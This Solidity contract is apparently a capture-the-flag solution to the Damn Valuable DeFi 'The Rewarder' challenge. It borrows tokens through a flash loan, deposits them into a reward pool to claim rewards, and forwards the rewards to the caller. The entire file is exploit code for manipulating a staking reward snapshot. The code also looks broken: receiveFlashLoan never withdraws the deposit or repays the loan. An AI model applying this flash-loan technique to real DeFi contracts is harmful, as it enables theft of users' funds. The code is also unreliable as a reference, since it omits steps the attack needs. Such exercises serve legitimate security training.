// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "../DamnValuableToken.sol";
import "./AccountingToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

import "hardhat/console.sol";

contract TheRewarderAttacker {
    FlashLoanerPool flashLoanerPool;
    DamnValuableToken damnValuableToken;
    TheRewarderPool theRewarderPool;
    RewardToken rewardToken;

    constructor(
        address flashLoanerPool_,
        address damnValuableToken_,
        address theRewarderPool_,
        address rewardToken_
    ) {
        flashLoanerPool = FlashLoanerPool(flashLoanerPool_);
        damnValuableToken = DamnValuableToken(damnValuableToken_);
        theRewarderPool = TheRewarderPool(theRewarderPool_);
        rewardToken = RewardToken(rewardToken_);
    }

    function attack(uint256 amount) external {
        flashLoanerPool.flashLoan(amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        damnValuableToken.approve(address(theRewarderPool), amount);
        theRewarderPool.deposit(amount);
    }
}
